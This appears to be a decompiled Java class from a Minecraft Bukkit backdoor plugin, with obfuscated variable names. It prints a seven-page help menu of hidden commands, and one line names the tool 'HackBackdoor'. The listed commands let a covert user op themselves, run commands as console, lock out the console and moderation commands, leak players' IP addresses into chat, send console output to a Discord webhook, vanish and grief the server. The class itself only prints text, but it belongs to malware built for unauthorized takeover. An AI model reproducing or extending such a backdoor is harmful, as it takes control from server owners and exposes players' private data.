/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.help;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.Tips;
import me.system.runner.utils.Settings;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class HelpCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return false;
    }

    public HelpCommand() {
        HelpCommand lllllllllllllllIIlIlIllIIllIIIll;
    }

    @Override
    public void execute(Core lllllllllllllllIIlIlIllIIlIIIlII, String lllllllllllllllIIlIlIllIIlIIIIll, String[] lllllllllllllllIIlIlIllIIlIIIIlI, Player lllllllllllllllIIlIlIllIIIlllllI) {
        int lllllllllllllllIIlIlIllIIlIIIIII = 7;
        if (lllllllllllllllIIlIlIllIIlIIIIlI.length <= 1) {
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(Settings.USAGE(String.valueOf(new StringBuilder().append("help <1-").append(lllllllllllllllIIlIlIllIIlIIIIII).append(">"))));
        } else if (lllllllllllllllIIlIlIllIIlIIIIlI[1].equalsIgnoreCase("1")) {
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(String.valueOf(new StringBuilder().append("         ").append(Settings.DARK_RED).append(Settings.NAME).append(" by ").append("Wendellmeset")));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7logout &8l &fLogs out so you can speak again!"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7blatant &8l &fTurns blatant mode on or off"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7status &8l &fGives you server and ").append(Settings.NAME).append(" info"))));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7adminhelp &8l &fLists ").append(Settings.NAME).append(" admin commands!"))));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7sc &8l &fTalk to all players logged in on the server"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7chat &8l &fSend a chat without having to log out"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7op &8l &fOp yourself or another player!"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7deop &8l &fDeops you or another player!"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7plugins &8l &fLists the server plugins"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7nameme &8l &fRe-names you"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7nameall &8l &fRe-names all players"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7msg &8l &fMessages another player"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7reply &8l &fReplys to the person who messaged you last"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7premiumhelp &8l &fViews help page for premium users"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7fn &8l &fLists file manager commands"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8(").append(Settings.DARK_RED).append("Tip&8) l &7").append(Tips.getTip()))));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        } else if (lllllllllllllllIIlIlIllIIlIIIIlI[1].equalsIgnoreCase("2")) {
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(String.valueOf(new StringBuilder().append("         ").append(Settings.DARK_RED).append(Settings.NAME).append(" by ").append("Wendellmeset")));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7invSteal &8l &fCopies someones inventory and gives it to you"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7noDmg &8l &fMake a player not able to damage others"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7freeze &8l &fFreezes another player"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7unfreeze &8l &fUnfreezes another player"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7enable &8l &fEnables another plugin"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7disable &8l &fDisables another plugin"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7tp &8l &fTeleports you to another player"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7tpall &8l &fTeleports all players to you or another player"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7lockconsole &8l &fEnables/Disables console to exe cmds"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7cmdspy &8l &fToggles command spy!"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7invsee &8l &fOpens another players inventory"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7kill &8l &fKills you or another player"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7checkError &8l &fChecks the last error logged with ").append(Settings.NAME))));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7spin &8l &fSpin the entire world"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8(").append(Settings.DARK_RED).append("Tip&8) l &7").append(Tips.getTip()))));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        } else if (lllllllllllllllIIlIlIllIIlIIIIlI[1].equalsIgnoreCase("3")) {
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(String.valueOf(new StringBuilder().append("         ").append(Settings.DARK_RED).append(Settings.NAME).append(" by ").append("Wendellmeset")));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7listloggedin &8l &fLists logged in players! (To HackBackdoor)"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7flip &8l &fMakes a player flip 180"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7modcmds &8l &fDisables/Enables mod commands like /ban /kick"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7sudo &8l &fforces a player chat or execute a command"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7bc &8l &fBroadcasts a message to the entire server"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7spam &8l &fSpams the server with your message"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7god &8l &fEnables god mode for you or another player"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7save &8l &fSaves the world and player data"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7togglechat &8l &fEnables/Disables all players talking in chat"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7clearchat &8l &fClears chat"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7bombs &8l &fGives you a bomb to throw!"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7npu &8l &fStops players from picking up items"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7reload &8l &fReloads the server"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8(").append(Settings.DARK_RED).append("Tip&8) l &7").append(Tips.getTip()))));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        } else if (lllllllllllllllIIlIlIllIIlIIIIlI[1].equalsIgnoreCase("4")) {
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(String.valueOf(new StringBuilder().append("         ").append(Settings.DARK_RED).append(Settings.NAME).append(" by ").append("Wendellmeset")));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7console &8l &fExecutes a command as console"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7ride &8l &fRide another player"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7rideme &8l &Force someone to ride you"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7stop &8l &fStops the server"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7nextmsg &8l &fSet the users next message they type"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7flood &8l &fFloods chat"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7lockcmds &8l &fLocks all / commands for people not logged in"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7lockcontainers &8l &fLocks all chests and all containers"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7coords &8l &fTells you another players or your coords"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7item &8l &fGives you any item you want"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7tip &8l &fGet a random ").append(Settings.NAME).append(" tip"))));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7fly &8l &fToggles flight for you or another player"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7feed &8l &fFeeds you or another player to max"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7heal &8l &fHeals you or another player to max"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8(").append(Settings.DARK_RED).append("Tip&8) l &7").append(Tips.getTip()))));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        } else if (lllllllllllllllIIlIlIllIIlIIIIlI[1].equalsIgnoreCase("5")) {
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(String.valueOf(new StringBuilder().append("         ").append(Settings.DARK_RED).append(Settings.NAME).append(" by ").append("Wendellmeset")));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7lookup &8l &fLooks up another players IP Address"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7gamemode &8l &fChange your gamemode"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7wand &8l &fUse the griefing wands"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7piss &8l &fMakes player piss a block"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7whitelist &8l &fTurn whitelist on or off silently"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7leakips &8l &fLeaks everyones ip into the chat who isnt logged in"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7ban &8l &fBans a player using a custom system"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7unban &8l &fUnbans a player"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7eChest &8l &fOpens a players ender chest"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7kick &8l &fKick a player"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7vanish &8l &fVanish yourself so no one can see you"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7dupe &8l &fOpens the dupe machine!"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7spamWebhook &8l &fSpams a webhook with a message"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7penis &8l &fMakes it rain penises"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8(").append(Settings.DARK_RED).append("Tip&8) l &7").append(Tips.getTip()))));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        } else if (lllllllllllllllIIlIlIllIIlIIIIlI[1].equalsIgnoreCase("6")) {
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(String.valueOf(new StringBuilder().append("         ").append(Settings.DARK_RED).append(Settings.NAME).append(" by ").append("Wendellmeset")));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7sethealth &8l &fSets the max health"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7setmotd &8l &fSets the server MOTD"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7floodconsole &8l &fFloods console"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7logconsole &8l &fLog console output to a discord webhook"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7xp &8l &fGive yourself XP"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7launch &8l &fLaunch a player into the air"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7fire &8l &fSet a player on fire"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7void &8l &fSend a player to the void"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7dirt &8l &fMake a player only able to place dirt"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7version &8l &fTells you the version of ").append(Settings.NAME).append(" that you are using!"))));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8(").append(Settings.DARK_RED).append("Tip&8) l &7").append(Tips.getTip()))));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        } else if (lllllllllllllllIIlIlIllIIlIIIIlI[1].equalsIgnoreCase("7")) {
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(String.valueOf(new StringBuilder().append("         ").append(Settings.DARK_RED).append(Settings.NAME).append(" by ").append("Wendellmeset")));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7popup &8l &fForce a player to open their inventory."));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7swap &8l &fSwap two player locations!"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7scare &8l &fSpawn a mob behind a player."));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7trap &8l &fTraps a player in a chosen block"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7earrape &8l &fPlays an MC sound into someone's game."));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7fix &8l &fFixes the item in your hand, or type fix * to fix all items in your inventory"));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7enchant &8l &fEnchants an item in your hand."));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7spamsummon &8l &fSpam summons your choice of mob."));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage("");
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8(").append(Settings.DARK_RED).append("Tip&8) l &7").append(Tips.getTip()))));
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
        } else {
            lllllllllllllllIIlIlIllIIIlllllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("That page does not exist. Use pages 1-").append(lllllllllllllllIIlIlIllIIlIIIIII))));
        }
    }
}

